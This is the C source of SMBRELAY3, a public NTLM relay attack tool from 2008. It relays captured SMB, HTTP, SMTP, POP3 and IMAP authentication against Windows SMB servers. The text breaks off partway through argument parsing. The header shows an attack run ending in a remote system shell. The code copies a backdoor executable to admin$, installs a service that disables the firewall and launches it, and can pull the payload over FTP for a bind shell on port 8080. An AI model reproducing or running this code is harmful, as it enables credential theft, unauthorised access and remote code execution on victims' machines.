/*
*
* SMBRELAY 3 - NTLM replay attack (version 1.0 ) public version
* (c) 2008 Andres Tarasco Acuña ( atarasco _at_ gmail.com )
* URL: http://tarasco.org/Web/tools.html
* 
*
* This new version of smbrelay have been developed for supporting more attacks than previous 
* versions and should work under win32 and linux. (SMB to SMB attack needs a free 445/tcp port
* so this attack can be "only" executed under linux or under modified win32 system.
*
* To run smbrelay3 under win32 change the value TransportBindName="\\Device\\" to TransportBindName=""
* under HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NetBT\Parameters and then reboot.
*
*
* This is the first public tool allowing attacks against other protocols like HTTP. This tool 
* couldnt be written without Iñaki Lopez NTLM library. :)
*
* Main goal of SMBRELAY3 is to execute remote code when receiving incoming SMB/HTTP/IMAP/POP3/SMTP connections
* from network users. If the incoming request is from an user with with administrative privileges or just 
* "advanced user" privileges on the target system, you will get automatically get a system shell. 
*
* If the incoming connection is from a simple user, srvcheck attack is executed with replayed credentials.
*
*  This smbrelay3 release implements the following attacks:
*  - SMB  to SMB relay 
*  - HTTP to SMB relay
*  - SMTP to SMB relay
*  - POP3 to SMB relay
*  - IMAP to SMB relay
*
* Also there is another feature named "--psexec attack" that have been added. This feature allows remote shells, 
* like sysinternals psexec, under non win32 plataforms. This mode allows to use the native pwdump output hash to
* authenticate against the remote service. You dont need anymore to crack your NTLM hashes in order to connect to
* a remote service.
*
* Lots of features can be added in the future like binding stabilished connections to port 445 and allowing 
* incoming connections. However, just attacking administrative accounts seems to be the fast choice ;)
*
* Here is an HTTP to SMB attack example:
*

C:\smbrelay3>smbrelay3.exe --ListForHTTPRequests --AlternativePort 81 --v

SmbRelay3 - SMB to SMB and HTTP to SMB replay attack
(c) 2007 - 2008 Andres Tarasco - atarasco@gmail.com
Website: http://www.tarasco.org

[+] Listening HTTP thread at port 81
[+] Accepted Connection - Replaying against 192.168.1.2
[+] Read First HTTP Request...
[+] Sending Default HTTP 401 Error response and asking for authentiation NTLM
[+] Read Second HTTP Request with Auhorization Header..
Init HTTP to SMB attack - Connecting with: 192.168.1.2:445
[+] Sending SMB Authentication Handshake
[+] Received SMB Message with NTLM v2 packet
[+] Sending NTLM Challenge from SMB Server to the HTTP Client
[+] Received Final Authentication packet from remote HTTP Client
UserName: 		Administrator
DomainName: 	 192.168.1.36
WorkstationName: SERVIDOR
[+] Trying to authenticate to remote SMB as Administrator
[+] Sending Final SMB Authentication packet with NTLM Message type 3
[+] SessionSetupAndX Completed
[+] Authenticacion against 192.168.1.2 Succeed with username Administrator
[+] Connecting against IPC$
[+] Trying to connect to admin$
[+] Creating Remote File smrs.exe under admin$
[+] Writing File smrs.exe into admin$
[+] Closing File handle - FID: 800f
[+] Opening Remote Service Control Manager pipe \svcctl
[+] Sending RPC BindRequest to SCM pipe
[+] Reading Response from Binding Request
[+] Opening Remote Service Control Manager
[+] Creating Remote Service
[+] Opening Remote Service
[+] Starting Remote Service...
[+] Now Remote Service is running... Try to connect to 192.168.1.2:8080

C:\smbrelay3>nc 192.168.1.2 8080
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

C:\WINDOWS\system32>


Notes:
-------
1- When the remote connection tries to authenticate itself as an anonymous connection, smbrelays answers with an
STATUS_LOGON_FAILURE Message. That will force the incoming client to authenticate themself as an user instead of using null session.

2- SMB to SMB relay does not work replaying the authentication against the same incoming Windows 2003 client. 
Windows 2003 security baseline do not allow to reuse the same NTLMv2 Challenge for both incomming and outgoing connection. 
Its recomended to use the "--SMBDestinationHost" parameter as an alternative host to compromise.
Note: This restriction only aplies to SMBtoSMB replay attacks. Other protocols do not suffer from the same restriction.

3- For more information, check the readme file.

4- Verbose parameter (--v or --vv) is not working properly yet, fix it yourself or wait for an improved release (maybe never)

5- This is the public release. Improved relay attacks like HTTP/SMB --to--> "HTTP OWA email download" can be done just tweaking the code. Link it with
your favorite HTTP library (like FSCAN HTTP Core) and do it yourself =) (do not ask)

6- To compile smbrelay3 under linux, just type "g++ -lpthread -lssl *.cpp -o smbrelay3"

*/
#include "smbrelay.h"
#include "httprelay.h"
#include "smtprelay.h"
#include "pop3relay.h"
#include "imaprelay.h"
#include "smb.h"
#include "ntlm.h"
#include "misc.h"
#include "payload.h"


#include <stdio.h>
#include <stdlib.h>
#include <time.h>


const uint8 SpoofedChallengeKey[]="\x11\x22\x33\x44\x55\x66\x77\x88";
#ifdef WIN32
#pragma comment(lib, "ws2_32.lib")
#endif


char	lpBackdoorFile[]="smrs.exe";
int		ListForSMBRequests=0;
int		ListForHTTPRequests=0;
int		ListForSMTPRequests=0;
int		ListForIMAPRequests=0;
int		ListForPOP3Requests=0;
int	    ProxySMB=0;
int		PsExec=0;
int     AdminResourceAvailable;

int		ListeningPort; //Listen port
int		DestinationPort=445;
char	*DestinationHost=NULL;

char	*lpUsername;
char	*lpPassword;


int		verbose=0; //Verbose Level


char ftphost[100]="";
int  ftpport=21;
char ftpusername[100]="a";
char ftppass[100]="a";
char lpSrcHostname[256]="SmbRelay3";
extern uint16 MultpleID;

/***************************************************************************************************************/

int HandleIncommingSmbRequest(RELAY *relay, char *destinationhostname, char *AlternateDestinationHostname, int destinationport, int ReconnectToSameTarget)
{

	unsigned char buf[4096];
	unsigned char buf2[4096];
	smheader *SmbPacket1,*SmbPacket2;//,*SmbPacket3;
	smheader *errorpacket;
	smheader *NegotiateProtocol;
	smheader *NegotiateProtocolResponse;
	int i;	
	char *p;
	int leido;
	char clientRequest[4096];
	uint16 OriginalUserID;

	//Conectando con el servidor y Negociando SMB
	CleanLine(verbose);
	if (ReconnectToSameTarget) {
		printf("[+] Connecting with remote SMB Server: %s:%i\r",destinationhostname,destinationport);
	} else {
		printf("[+] Connecting with Alternative SMB Server: %s:%i\r",destinationhostname,destinationport);
	}

	i=ConnectToRemoteHost(relay,destinationhostname,destinationport);
	if (!i) {
		CleanLine(verbose);
		printf("[-] Unable to connect to remote host\r");
		if (!AlternateDestinationHostname)  {        
			return(0);
		} else {
			return (HandleIncommingSmbRequest(relay,AlternateDestinationHostname,NULL,destinationport,0));
		}        
	}

	CleanLine(verbose);
	printf("[+] Sending SMB Protocol Handshake against remote SMB Server: %s\r",destinationhostname);
	//if (verbose) printf("\n");
	p = AddDialect(NULL,"PC NETWORK PROGRAM 1.0",0x02, &i);
	//p = AddDialect(p,"PC NETWORK PROGRAM 1.0", 0x02,&i);
	p = AddDialect(p,"LANMAN1.0", 0x02,&i);
	p = AddDialect(p,"Windows for Workgroups 3.1a", 0x02,&i);
	p = AddDialect(p,"LM1.2X002", 0x02,&i);
	p = AddDialect(p,"LANMAN2.1", 0x02,&i);
	p = AddDialect(p,"NT LM 0.12", 0x02,&i);
	NegotiateProtocol=BuildSmbPacket(NULL,NEGOTIATEPROTOCOLREQUEST,0,p,i);
	free(p);
	i=SendBytesAndWaitForResponse(relay->destination,(char*)NegotiateProtocol,SmbPacketLen(NegotiateProtocol),(char*)buf,sizeof(buf),SMBWAITTIMEOUT);
	free(NegotiateProtocol);
	if (i<=0){
		CleanLine(verbose);
		printf("[-] Initial SMBHandShake (LanManager Negotiation) Failed\n");
		return(0);
	}
	//Enviando peticiones de negociacion con el servidor para obtener el challenge
	SmbPacket1=BuildSmbPacket1();
	if (debug)  {
		CleanLine(verbose);
		printf("\n[*] Dumping SMB Packet With NTLM Message Type 1\n");
		DumpMem((char*)SmbPacket1,SmbPacketLen(SmbPacket1));
	}
	CleanLine(verbose);
	printf("[+] Sending SMB packet with NTLM message I against remote SMB Server:%s\r",destinationhostname);

	SmbPacket2=GetSmbPacket2(relay,SmbPacket1);
	free(SmbPacket1);
	if  (SmbPacket2==NULL) {
		printf("[-] Unable to receive SMB Packet with NTLM Message Type 2\n");
		return(0);
	}
	if  (SmbPacket2->NtStatus!=0xc0000016) {
		printf("[-] NTLM Negotiation Failed (Status = 0x%8.8x)\n",SmbPacket2->NtStatus);
		return(0);

	}


	tSmbNtlmAuthChallenge *challenge=(tSmbNtlmAuthChallenge*)GetNTLMPacketFromSmbPacket(SmbPacket2);
	if (verbose) {
		printf("[*] Dumping Received SMB Packet with NTLM Message2\r");
		CleanLine(verbose);
		dumpAuthChallenge(stderr,challenge);
		if (debug) DumpMem((char*)SmbPacket2,SmbPacketLen(SmbPacket2));
	}
	if (ReconnectToSameTarget)
	{
		//HACK! Windows 2003 does not support SMBtoSMB relay against the same host, so we are going to check signatures
		//IF the system is protected, try with an alternate host
		//		printf("blob: %i\n",( (SessionSetupAndXResponse*)(SmbPacket2->buffer))->SecurityBloblength);
		//		DumpMem((char*) SmbPacket2->buffer + sizeof(SessionSetupAndXResponse) +  ( (SessionSetupAndXResponse*)(SmbPacket2->buffer))->SecurityBloblength +1,40);
		Widetochar((char*)buf2,(char*) SmbPacket2->buffer + sizeof(SessionSetupAndXResponse)+ ( (SessionSetupAndXResponse*)(SmbPacket2->buffer))->SecurityBloblength +1,40);
		//printf("Native OS: %s\n",buf2);
		if ( (memcmp(buf2,"Windows 2003",12)==0) || (memcmp(buf2,"Windows Server 2003",19)==0) || (memcmp(buf2,"Windows Vista",19)==0) )
		{	
			closesocket(relay->destination);
			CleanLine(verbose);
			if (AlternateDestinationHostname)
			{
				printf("[-] Incoming client is Windows 2003. Trying alternative SMB Host %s\r",AlternateDestinationHostname);
				return ( HandleIncommingSmbRequest(relay, AlternateDestinationHostname,NULL,destinationport,0) );
			} else {
				printf("[-] Incoming client is Windows >= 2003. Unable to attack the same host\n");
				printf("[-] Next time try to add an extra target with --SMBDestinationHost\r");
				return(0);
			}
	
		}
	}



	//Negociando LanManager con el cliente
	/******************init*******************************/
	CleanLine(verbose);
	printf("[+] Negotiating SMB LanManager Protocol with incomming client\r"); 
	leido=recv( relay->source,clientRequest,sizeof(clientRequest),0 );

	MultpleID=((smheader*)clientRequest)->multipleID;

	NegotiateProtocolResponse=BuildSmbPacket(NULL,NEGOTIATEPROTOCOLREQUEST,CONTINUERESPONSE,NULL,0);
	send(relay->source,(char*)NegotiateProtocolResponse,SmbPacketLen(NegotiateProtocolResponse),0);


	//leyendo peticion SMB del cliente (paquete NTLMv1)
	CleanLine(verbose);
	printf("[+] Reading Incoming request with NTLM packet type 1\r");
	leido=recv( relay->source,clientRequest,sizeof(clientRequest),0 );
	if (debug) {
		CleanLine(verbose);
		printf("[*] Dumping received SMB Packet ( %i bytes )\n",leido);
		DumpMem(clientRequest,leido);
	}

	//printf("[+] Answering Incoming request with SMB packet with NTLM type 2 (Session key)\r");
	CleanLine(verbose);
	printf("[+] Sending Challenge Key and waiting for authentication packet\r");

	OriginalUserID=SmbPacket2->UserID;
	MultpleID+=64;
	SmbPacket2->multipleID=MultpleID;
	
	leido=SendBytesAndWaitForResponse(relay->source,(char*)SmbPacket2, SmbPacketLen(SmbPacket2),(char*)clientRequest,sizeof(clientRequest),SMBWAITTIMEOUT);

	if (leido==0) {
		CleanLine(verbose);
		printf("[-] Error while reading NTLM type3 packet from incomming SMB connection\n");
		return(0);
	}

	if (debug)  {
		CleanLine(verbose);
		printf("[*] Dumping received SMB Packet ( %i bytes )\n",leido);
		DumpMem((char*)clientRequest,leido);
	}

	if (     ((char*)clientRequest)[0] == SESSIONLOGOFF )   {
		//    if ( ((smheader*)clientRequest)->SmbMessageType == SESSIONLOGOFF )   {
		CleanLine(verbose);
		printf("[-] Error. The client forced LogOff and disconnected.\n");
		return(0);
	}


	//NULL SESSION
	if ( ((tSmbNtlmAuthResponse *)GetNTLMPacket3FromSmbPacket((smheader *)clientRequest))->uUser.len==0) {        
		CleanLine(verbose);
		printf("[-] Error. The client tried to authenticate with a Null Session.\n");
		errorpacket=BuildSmbPacket((smheader*)clientRequest,SESSIONSETUPANDX,ERRORRESPONSE,NULL,0);
		errorpacket->flags=SmbPacket2->flags;
		if (debug) {
			DumpMem((char*)errorpacket,SmbPacketLen(errorpacket));
		}
		send(relay->source,(char*)errorpacket,SmbPacketLen(errorpacket),0);
		shutdown(relay->source,0);
		return(0);

	} 


	((smheader*)clientRequest)->UserID=OriginalUserID;
	i=SendBytesAndWaitForResponse(relay->destination,(char*)clientRequest, SmbPacketLen(((smheader*)clientRequest)),(char*)buf,sizeof(buf),SMBWAITTIMEOUT);
	if (i<=0){
		printf("[-] Error reading Server Authentication Response                              \n");
		return(0);
	}
	if (debug) {
		printf("[*] SessionSetupAndX Completed - Dumping received packet                                 \n");
		DumpMem(buf,i);
	}

	if (((smheader*)buf)->NtStatus!=0x00000000) {
		printf("[+] SessionSetupAndX Completed. Authentication Failed                          \n");
		errorpacket=BuildSmbPacket((smheader*)clientRequest,SESSIONSETUPANDX,ERRORRESPONSE,NULL,0);
		errorpacket->flags=SmbPacket2->flags;
		send(relay->source,(char*)errorpacket,SmbPacketLen(errorpacket),0);
		return(0);
	}
	if ( ((SessionSetupAndXResponse*)((smheader*)buf)->buffer)->Action & 0x0001 )
	{
		printf("[-] Authentication against Remote Host Failed. (Connected as Guest)\n");
		errorpacket=BuildSmbPacket((smheader*)clientRequest,SESSIONSETUPANDX,ERRORRESPONSE,NULL,0);
		errorpacket->flags=SmbPacket2->flags;
		send(relay->source,(char*)errorpacket,SmbPacketLen(errorpacket),0);
		return(0);
	}
	if (verbose) {
		printf("[+] Sending an STATUSOK Message to the client                                            \n");
	}

	errorpacket=BuildSmbPacket((smheader*)clientRequest,SESSIONSETUPANDX,CONTINUERESPONSE,NULL,0);
	errorpacket->flags=SmbPacket2->flags;
	send(relay->source,(char*)errorpacket,SmbPacketLen(errorpacket),0);
	shutdown(relay->source,0);


	printf("[+] SessionSetupAndX Completed. Authenticacion Succeed                                   \n");
	ExecuteCode( *relay);
	return(0);
}
/*********************************************/
int ReplayAttackAgainst(int srcProtocol, int dstProtocol,int port,char *hostname,  int DestinationPort)
{
	//Wait for incoming HTTP Requests and try
	SOCKET wsl;
	struct sockaddr_in door;
	RELAY *relay;
	char tmp[256];

	int clientLen;

	if((wsl = socket(PF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) return 1;
	door.sin_family = AF_INET;
	door.sin_addr.s_addr = htonl(INADDR_ANY);
	door.sin_port = htons(port);

	if(bind(wsl, (const struct sockaddr *) &door,sizeof(door)) == INVALID_SOCKET) {
		printf("[-] Error. Unable to bind to port %i\n",port);
		closesocket(wsl);
		return 0;
	}
	if(listen(wsl, SOMAXCONN) == INVALID_SOCKET) {
		printf("[-] Error. Unable to listen at port :%i\n",port);
		closesocket(wsl);
		return 0;
	}
	while (1) {
		printf("[+] Listening for incomming connections at port %i\r",port);
		relay=(RELAY*)malloc(sizeof(RELAY));
		clientLen=sizeof(relay->sourceaddr);
		relay->source=accept(wsl,(struct sockaddr *) &relay->sourceaddr,(socklen_t*)&clientLen);
		if (hostname)
		{
			strcpy(tmp,hostname);
		} else {
			strcpy(tmp,inet_ntoa(relay->sourceaddr.sin_addr));
		}
		strcpy(relay->hostname,tmp);
		printf("[+] Accepted Connection - Replaying against %s\n",tmp);
		relay->dstProtocol = dstProtocol;
		//if (verbose) printf("\n");
		switch (srcProtocol)
		{
		case REPLAY_HTTP:
			HandleIncommingHTTPRequest(relay,tmp,DestinationPort);
			break;
		case REPLAY_SMB:
			HandleIncommingSmbRequest(relay,inet_ntoa(relay->sourceaddr.sin_addr),hostname,DestinationPort,1);
			break;
		case REPLAY_SMTP:
			HandleIncommingSMTPRequest(relay,tmp,DestinationPort);
			break;
		case REPLAY_POP3:
			HandleIncommingPOP3Request(relay,tmp,DestinationPort);
			break;
		case REPLAY_IMAP:
			HandleIncommingIMAPRequest(relay,tmp,DestinationPort);
			break;
		default:
			printf("[-] protocol %i not supported or implemented\n",srcProtocol);
			return(0);
			break;
		}
		closesocket(relay->destination);
		closesocket(relay->source);
		free(relay);

	}
	return(1);
}



/*********************************************/
int StablishNTLMSession(RELAY relay,char *host, char *lpUserName, char *lpPassword)
{

	unsigned char buf[4096];
	smheader *SmbPacket1,*SmbPacket2,*SmbPacket3;
	smheader* NegotiateProtocol;
	int i;	
	char *p;

	printf("[+] Sending SMB Authentication Handshake                                    \r");
	p = AddDialect(NULL,"PC NETWORK PROGRAM 1.0",0x02, &i);    
	p = AddDialect(p,"LANMAN1.0", 0x02,&i);
	p = AddDialect(p,"Windows for Workgroups 3.1a", 0x02,&i);
	p = AddDialect(p,"LM1.2X002", 0x02,&i);
	p = AddDialect(p,"LANMAN2.1", 0x02,&i);
	p = AddDialect(p,"NT LM 0.12", 0x02,&i);    
	NegotiateProtocol=BuildSmbPacket(NULL,NEGOTIATEPROTOCOLREQUEST,0,p,i);
	free(p);
	i=SendBytesAndWaitForResponse(relay.destination,(char*)NegotiateProtocol,SmbPacketLen(NegotiateProtocol),(char*)buf,sizeof(buf),SMBWAITTIMEOUT);
	free(NegotiateProtocol);

	//i=InitSmbHandshake(&relay,(char*)buf,sizeof(buf));
	if (i<=0){
		printf("[+] Initial SMBHandShake (LanManager Negotiation) Failed                \n");
		return(0);
	}

	SmbPacket1=BuildSmbPacket1();
	if (debug) {
		printf("\n[*] Dumping SMB Packet With NTLM Message Type 1                                   \n");
		DumpMem((char*)SmbPacket1,SmbPacketLen(SmbPacket1));
	}

	SmbPacket2=GetSmbPacket2(&relay,SmbPacket1);
	free(SmbPacket1);
	if  (SmbPacket2==NULL) {
		printf("[-] Unable to receive SMB Packet with NTLM Message Type 2                 \n");
		free(SmbPacket2);
		return(0);
	}

	if  (SmbPacket2->NtStatus!=0xc0000016) {

		printf("[-] NTLM Negotiation Failed (Status = 0x%8.8x)\n",SmbPacket2->NtStatus);
		free(SmbPacket2);
		return(0);
	}


	tSmbNtlmAuthChallenge *challenge=(tSmbNtlmAuthChallenge*)GetNTLMPacketFromSmbPacket(SmbPacket2);

	if (verbose) {
		printf("[*] Dumping Received SMB Packet with NTLM Message2\n");
		dumpAuthChallenge(stderr,challenge);
		if (debug) DumpMem((char*)SmbPacket2,SmbPacketLen(SmbPacket2));

	}
	SmbPacket3=GetSmbPacket3(SmbPacket2,lpUserName, lpPassword,NULL,lpSrcHostname,(tSmbNtlmAuthResponse*)NULL); //<- anonymous connection under windows 2000

	free(SmbPacket2);
	if (debug) {
		printf("\n[*] Dumping Generated SMB Packet with NTLM Message3\n");
		DumpMem((char*)SmbPacket3,SmbPacketLen(SmbPacket3));
	}
	i=SendBytesAndWaitForResponse(relay.destination,(char*)SmbPacket3, SmbPacketLen(SmbPacket3),(char*)buf,sizeof(buf),SMBWAITTIMEOUT);
	free(SmbPacket3);
	//free(SmbPacket2);
	if (i<=0){
		printf("[-] Error reading Server Authentication Response                          \n");
		return(0);
	}


	if (debug) {
		printf("[*] SessionSetupAndX Completed - Dumping received packet                             \n");
		DumpMem(buf,i);
	}

	if (((smheader*)buf)->NtStatus!=0x00000000) {
		printf("[-] SessionSetupAndX Completed                                            \n");
		printf("[-] Authentication against Remote Host Failed (Error: 0x%8.8X\n",((smheader*)buf)->NtStatus!=0x00000000);
		return(0);
	}

	if ( ((SessionSetupAndXResponse*)((smheader*)buf)->buffer)->Action & 0x0001 )
	{
		printf("[-] Authentication against Remote Host Failed. (Connected as Guest)\n");

		return(0);
	}

	SetEnviroment(((smheader*)buf)->UserID,0,0);
	printf("[+] Authentication against %s Succeed as %s\n",host,lpUserName);
	return(1);

	/**************/



}





/*********************************************/
int ExecuteCode( RELAY relay) 
{
	unsigned char buf[4096];
	char ServicePath[4096];
	char path[256];
	smheader *packet;
	int i;	
	uint16 FID;
	uint8 ContextHandle[20 + 8]; // Alloc 8 more bytes needed by StartServiceW() stub
	int len;
	char data[4046];
	int status;
	CtxItem *ctx;


	//CONNECT TO IPC$
	memset(buf,'\0',sizeof(buf));
	memset(ContextHandle,'\0',sizeof(ContextHandle));
	//sprintf(path,"\\\\%s\\IPC$",inet_ntoa(relay.destinationaddr.sin_addr));
	sprintf(path,"\\\\%s\\IPC$",relay.hostname);
	i=BuildTreeConnectAndXStub((char*)buf,"",path,"?????");
	packet=BuildSmbPacket((smheader*)NULL,TREECONNETANDX,0,buf,i);

	printf("[+] Connecting against %s\r",path);
	if (verbose)
	{		
		printf("\n");
		if (debug) DumpMem((char*)packet,SmbPacketLen(packet));
	}
	i=SendBytesAndWaitForResponse(relay.destination,(char*)packet, SmbPacketLen(packet),(char*)buf,sizeof(buf),SMBWAITTIMEOUT);
	free(packet);
	if ((i<=0) || (((smheader*)buf)->NtStatus!=0x00000000) ){
		printf("[-] Error. Unable to connect to IPC$                             \n");
		return(0);
	}


	//Copy remote file to admin$
	status=WriteRemoteFile(relay, (smheader*)buf,lpBackdoorFile );

	//Bind to openSCManager
	packet=BuildSmbPacket((smheader*)buf,NTCREATEANDX,0,(void*)"\\svcctl",0);
	printf("[+] Opening Remote Service Control Manager pipe \\svcctl                        \r");
	if (verbose)
	{
		printf("\n");
		if (debug) DumpMem((char*)packet,SmbPacketLen(packet));
	}
	i=SendBytesAndWaitForResponse(relay.destination,(char*)packet, SmbPacketLen(packet),(char*)buf,sizeof(buf),SMBWAITTIMEOUT);
	free(packet);
	if ((i<=0) || (((smheader*)buf)->NtStatus!=0x00000000) ){
		printf("[-] Error. Unable to Open Control Manager pipe \\svcctl                       \n");
		return(0);
	}    


	//Save "\\svcctl" File Identification (FID) porque sera utilizado mas adelante en la peticion ReadAndX
	memcpy((char*)&FID,((smheader*)buf)->buffer+6,2);

	//Enviamos una peticion RPC binding
#ifdef WIN32
	ctx=(CtxItem *)AddBinddingInformation(NULL,"367abb81-9844-35f1-ad32-98f038001003","8a885d04-1ceb-11c9-9fe8-08002b104860",2,0,&i);
#else
	//HACK: We need to generate an uuidtostring() function for linux
	i = sizeof(CtxItem)*2;//dcerpcbind->NumberOfCtx;
	ctx=(CtxItem*)malloc(i);//dcerpcbind->NumberOfCtx);
	ctx[0].ContextID=0;
	ctx[0].NumberOfTransItems=1;		
	ctx[0].padding=0;
	ctx[0].AbstractSyntaxis.MayorVersion=2;
	ctx[0].AbstractSyntaxis.MinorVersion=0;
	memcpy((char*)ctx[0].AbstractSyntaxis.uuid,"\x81\xbb\x7a\x36\x44\x98\xf1\x35\xad\x32\x98\xf0\x38\x00\x10\x03",16);
	ctx[0].TransferSyntaxis.MayorVersion=2;
	ctx[0].TransferSyntaxis.MinorVersion=0;
	memcpy((char*)ctx[0].TransferSyntaxis.uuid,"\x04\x5d\x88\x8a\xeb\x1c\xc9\x11\x9f\xe8\x08\x00\x2b\x10\x48\x60",16);

	ctx[1].ContextID=1;
	ctx[1].NumberOfTransItems=1;		
	ctx[1].padding=0;
	ctx[1].AbstractSyntaxis.MayorVersion=2;
	ctx[1].AbstractSyntaxis.MinorVersion=0;
	memcpy((char*)ctx[1].AbstractSyntaxis.uuid,"\x81\xbb\x7a\x36\x44\x98\xf1\x35\xad\x32\x98\xf0\x38\x00\x10\x03",16);
	ctx[1].TransferSyntaxis.MayorVersion=1;
	ctx[1].TransferSyntaxis.MinorVersion=0;
	memcpy((char*)ctx[1].TransferSyntaxis.uuid,"\x2c\x1c\xb7\x6c\x12\x98\x40\x45\x01\x00\x00\x00\x00\x00\x00\x00",16);
#endif

	packet=BuildSmbPacket((smheader*)buf,WRITEANDX,RPCBIND,ctx,i);
	free(ctx);
	if (verbose)
	{		
		printf("[*] Sending RPC BindRequest to SCM pipe                                          \n");
		if (debug) DumpMem((char*)packet,SmbPacketLen(packet));
	}
	i=SendBytesAndWaitForResponse(relay.destination,(char*)packet, SmbPacketLen(packet),(char*)buf,sizeof(buf),SMBWAITTIMEOUT);
	free(packet);
	if ((i<=0) || (((smheader*)buf)->NtStatus!=0x00000000) ){
		printf("[-] Error. Unable to bind to SCM pipe                             \n");
		return(0);
	}

	//Leemos la respuesta del rpc binding. hay que hacerlo en otro paquete para que funcione correctamente.
	//De lo contrario obtenemos el error pipe bussy
	packet=BuildSmbPacket((smheader*)buf,READANDX,0,NULL,0);
	((ReadAndX*)packet->buffer)->FID=FID;	
	if (verbose)
	{		
		printf("[*] Reading Response from Binding Request                                      \n");
		if (debug) DumpMem((char*)packet,SmbPacketLen(packet));
	}
	i=SendBytesAndWaitForResponse(relay.destination,(char*)packet, SmbPacketLen(packet),(char*)buf,sizeof(buf),SMBWAITTIMEOUT);
	free(packet);
	if ((i<=0) || (((smheader*)buf)->NtStatus!=0x00000000) ){
		printf("[-] Error. Bad response from last Bindding attempt                  \n");
		return(0);
	}

	//Open SCMANAGER for Writting...
	sprintf(path,"\\\\%s",inet_ntoa(relay.destinationaddr.sin_addr));
	len=OpenScManagerWStub(data,path,SC_MANAGER_CREATE_SERVICE) ;
	packet=BuildSmbPacket((smheader*)buf,SMB_COM_TRANSACTION,OPENSCMANAGER,(char*)data,len);
	((SMB_COM_TRANSACTION_STRUCT*)packet->buffer)->FID=FID;
	printf("[+] Opening Remote Service Control Manager (Creating Service)            \r");
	if (verbose)
	{		
		printf("\n");
		if (debug) DumpMem((char*)packet,SmbPacketLen(packet));
	}

	i=SendBytesAndWaitForResponse(relay.destination,(char*)packet, SmbPacketLen(packet),(char*)buf,sizeof(buf),SMBWAITTIMEOUT);
	free(packet);

	if (( i<=0) || (((smheader*)buf)->NtStatus!=0x00000000)  || (GetDceRpcPacketFromBuffer(buf)->PacketType != RPC_RESPONSE) ){
		printf("[-] Error. Unable to Open Remote Service Control Manager (DCERPC FAULT)\n");
		
		if (strlen(ftphost)==0) {
			printf("[-] ftphost parameter not selected. Unable to execute srvcheck attack\n");
			return(0);
		}
		GenerateFTPTransfer(ServicePath,ftphost,ftpport,ftpusername,ftppass,lpBackdoorFile,NULL);        
		return (AttackWeakServices(relay, (char*)buf,path, FID,(char*)ServicePath));
		
	}

	memcpy((char*)ContextHandle,buf+i-24,20);
	//status=0;


	if (status) { //Creamos el servicio y lo abrimos para inciar        
		sprintf(ServicePath,"cmd.exe /c netsh firewall set opmode DISABLE DISABLE & %s",lpBackdoorFile);               
	} else {        
		if (strlen(ftphost)==0) {
			printf("[-] ftphost parameter not selected. Unable to execute reverse payload\n");
			return(0);
		}
		GenerateFTPTransfer(ServicePath,ftphost,ftpport,ftpusername,ftppass,lpBackdoorFile,NULL);        
	}

	len=CreateServiceWStub(data,(char*)ContextHandle,"SmbRelay","Smbrelay3 Shell Service",ServicePath,SERVICE_AUTO_START,SERVICE_WIN32_OWN_PROCESS);
	packet=BuildSmbPacket((smheader*)buf,SMB_COM_TRANSACTION,CREATESERVICE,data,len);//ContextHandle, 20);	
	((SMB_COM_TRANSACTION_STRUCT*)packet->buffer)->FID=FID;
	printf("[+] Creating Remote Service                                                          \r");
	if (verbose)
	{
		printf("\n");
		if (debug) DumpMem((char*)packet,SmbPacketLen(packet));
	}
	i=SendBytesAndWaitForResponse(relay.destination,(char*)packet, SmbPacketLen(packet),(char*)buf,sizeof(buf),SMBWAITTIMEOUT);
	free(packet);
	if (i<=0){
		printf("[-] Error. Unable to create Remote Service \n");
		return(0);
	}

	len=OpenServiceWStub(data,(char*)ContextHandle,"SmbRelay",  SERVICE_START);
	packet=BuildSmbPacket((smheader*)buf,SMB_COM_TRANSACTION,OPENSERVICEW,data,len);
	((SMB_COM_TRANSACTION_STRUCT*)packet->buffer)->FID=FID;
	printf("[+] Opening Remote Service                                                          \r");
	if (verbose)
	{	
		printf("\n");
		if (debug) DumpMem((char*)packet,SmbPacketLen(packet));
	}
	i=SendBytesAndWaitForResponse(relay.destination,(char*)packet, SmbPacketLen(packet),(char*)buf,sizeof(buf),SMBWAITTIMEOUT);
	free(packet);
	if ((i<=0) || (((smheader*)buf)->NtStatus!=0x00000000) ){
		printf("[-] Error. Unable to Open Remote service                            \n");
		return(0);
	}

	memcpy((char*)ContextHandle,buf+i-24,20);


	packet=BuildSmbPacket((smheader*)buf,SMB_COM_TRANSACTION,STARTSERVICE,ContextHandle, 20 + 8);
	((SMB_COM_TRANSACTION_STRUCT*)packet->buffer)->FID=FID;
	printf("[+] Starting Remote Service...                                                       \r");
	if (verbose)
	{		
		printf("\n");
		if (debug) DumpMem((char*)packet,SmbPacketLen(packet));
	}
	send(relay.destination, (char*)packet,  SmbPacketLen(packet),0) ;
	free(packet);
	Sleep(1000);
	printf("[+] *** Remote SmbRelay3 BindShell Service Running ***: (%s:%i)\n\n",relay.hostname,8080);

	Sleep(3000);
	return(1);
}


/*********************************************/


int main(int argc, char* argv[]) {

#ifdef WIN32
	WSADATA ws;
#endif 
	int i;
	RELAY relay;
	int srcProtocol;
	int dstProtocol= REPLAY_SMB;
	Banner();
#ifdef WIN32
	if (WSAStartup( MAKEWORD(2,2), &ws )!=0) {
		exit(0);
	}
#endif


	if (argc==1) { usage(); }

	for (i=1;i<argc;i++) 
	{
		if (  (argv[i][0]=='-') ) 
		{
			if (strcmp(argv[i],"--ListForSMBRequests")==0) {
				ListForSMBRequests=1;
				ListeningPort=445;
				srcProtocol=REPLAY_SMB;
			} else if (strcmp(argv[i],"--ListForHTTPRequests")==0) {
				ListForHTTPRequests=1;
				ListeningPort=80;
				srcProtocol=REPLAY_HTTP;
			}else if (strcmp(argv[i],"--ListForSMTPRequests")==0) {
				ListForHTTPRequests=1;
				ListeningPort=25;
				srcProtocol=REPLAY_SMTP;
			}else if (strcmp(argv[i],"--ListForIMAPRequests")==0) {
				ListForHTTPRequests=1;
				ListeningPort=143;
				srcProtocol=REPLAY_IMAP;
			}else if (strcmp(argv[i],"--ListForPOP3Requests")==0) {
				ListForHTTPRequests=1;
				ListeningPort=110;
				srcProtocol=REPLAY_POP3;
			}  else if (strcmp(argv[i],"--psexec")==0) {
				PsExec=1;
				DestinationHost=argv[i+1];
				lpUsername=argv[i+2];

				lpPassword=argv[i+3];					
				i+=3;
				srcProtocol=PSEXEC;

			} else if (strcmp(argv[i],"--AlternativeDstPort")==0) {
				DestinationPort=atoi(argv[i+1]);
